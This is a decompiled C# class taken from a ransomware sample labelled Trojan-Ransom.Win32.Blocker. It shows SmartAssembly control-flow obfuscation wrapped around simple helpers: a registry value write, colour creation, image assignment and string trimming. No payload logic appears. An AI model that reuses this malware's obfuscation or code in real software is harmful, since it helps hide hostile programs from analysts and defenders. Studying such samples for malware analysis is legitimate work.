// Decompiled with JetBrains decompiler
// Type: SmartAssembly.Attributes.PoweredByAttribute
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SmartAssembly.Attributes
{
  public sealed class PoweredByAttribute : Attribute
  {
    public PoweredByAttribute(string s)
    {
      try
      {
      }
      catch (Exception ex)
      {
        string o2 = s;
        StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
        throw;
      }
    }

    static PoweredByAttribute()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴍ(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] object obj2,
      [In] RegistryValueKind obj3,
      [In] int obj4,
      [In] int obj5)
    {
      int num1;
      try
      {
        num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 3:
              goto label_7;
            case 1:
              num1 = 4;
              continue;
            case 5:
              goto label_8;
            default:
              int num2;
              switch (obj5 ^ obj4)
              {
                case 78:
                  num2 = 2;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SetValue(obj1, obj2, obj3);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        RegistryKey o3 = obj0;
        string o4 = obj1;
        object o5 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<RegistryValueKind> o6 = (Enum) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o8 = (ValueType) obj5;
        StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, o5, (object) o6, (object) o7, (object) o8);
        throw;
      }
    }

    internal static System.Drawing.Color Ⴈ(
      [In] int obj0,
      [In] int obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj5 ^ obj4)
        {
          case 36:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              goto label_8;
            case 1:
            case 5:
              num1 = 2;
              continue;
            case 2:
            case 3:
              goto label_3;
            case 6:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (PoweredByAttribute.Ⴈ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return System.Drawing.Color.FromArgb(obj0, obj1, obj2, obj3);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj5;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    internal static void Ⴗ([In] PictureBox obj0, [In] Image obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 4;
              continue;
            case 2:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 102:
                  num2 = 2;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Image = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        PictureBox o3 = obj0;
        Image o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static string Ⴀ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 109:
            num2 = 5;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
            case 4:
            case 5:
              goto label_8;
            case 2:
              goto label_3;
            case 6:
              num1 = 2;
              continue;
            case 7:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (PoweredByAttribute.Ⴀ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.Trim();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }
  }
}
